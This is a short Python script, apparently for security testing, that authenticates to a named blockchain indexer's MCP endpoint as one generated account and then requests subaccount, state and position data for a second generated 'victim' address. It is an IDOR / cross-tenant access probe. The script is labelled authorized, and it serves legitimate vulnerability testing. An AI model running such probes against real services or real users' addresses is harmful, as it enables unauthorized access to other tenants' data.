import base64, json, re, requests, os
from eth_keys import keys
from eth_utils import keccak
from bech32 import bech32_encode, convertbits

BASE = "https://indexer.svpchain.com/mcp"

def svp_owner(privbytes):
    pub = keys.PrivateKey(privbytes).public_key.to_bytes()
    a = keccak(pub)[-20:]
    return bech32_encode("svp", convertbits(list(a), 8, 5))

def new_session():
    r = requests.post(BASE, timeout=12, headers={
        "Content-Type": "application/json", "Accept": "application/json, text/event-stream"},
        json={"jsonrpc": "2.0", "id": 0, "method": "initialize",
              "params": {"protocolVersion": "2024-11-05", "capabilities": {},
                         "clientInfo": {"name": "probe", "version": "0.1"}}})
    sid = r.headers.get("Mcp-Session-Id")
    h = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream",
         "Mcp-Session-Id": sid}
    requests.post(BASE, timeout=12, headers=h,
                  json={"jsonrpc": "2.0", "method": "notifications/initialized"})
    return h

def call(h, method, args, bearer=None):
    hh = dict(h)
    if bearer:
        hh["Authorization"] = f"Bearer {bearer}"
    r = requests.post(BASE, timeout=12, headers=hh,
                      json={"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                            "params": {"name": method, "arguments": args}})
    m = re.search(r"data: (\{.*\})", r.text)
    return json.loads(m.group(1)) if m else {"raw": r.text[:300]}

def get_bearer(privbytes):
    h = new_session()
    owner = svp_owner(privbytes)
    ch = call(h, "auth_challenge", {"owner": owner})
    txt = ch["result"]["content"][0]["text"]
    obj = json.loads(txt)
    challenge = obj["challenge"]; nonce = obj["nonce"]
    digest = keccak(text=challenge)
    sig = keys.PrivateKey(privbytes).sign_msg_hash(digest)
    b64 = base64.b64encode(bytes(sig)).decode()
    ver = call(h, "auth_verify", {"nonce": nonce, "signature": b64})
    out = ver["result"]["content"][0]["text"]
    bearer = json.loads(out).get("bearer_token")
    return h, owner, bearer

print("="*70)
print("MCP IDOR / CROSS-TENANT TEST — authorized session, single requests")
print("="*70)

# Account A (attacker) gets a real bearer
privA = os.urandom(32)
hA, ownerA, bearerA = get_bearer(privA)
print(f"\n[A] owner={ownerA}  bearer={'YES' if bearerA else 'NO'}")
if not bearerA:
    print("  bearer failed; abort")
    raise SystemExit

# Account B (victim) — different key
privB = os.urandom(32)
ownerB = svp_owner(privB)
print(f"[B] owner={ownerB} (victim, different key)")

# Tools that may expose cross-tenant data: get_subaccount, whoami, faucet_claim
for tool, args in [
    ("get_subaccount", {"address": ownerB, "subaccount_number": 0}),
    ("get_subaccount", {"address": ownerA, "subaccount_number": 0}),
    ("whoami", {}),
    ("get_account_state", {"address": ownerB}),
    ("get_positions", {"address": ownerB}),
]:
    res = call(hA, tool, args, bearer=bearerA)
    txt = res.get("result", {}).get("content", [{}])[0].get("text", "")
    print(f"\n[{tool}] as A, target={args.get('address','self')}")
    print("   ->", txt[:240].replace("\n", " "))
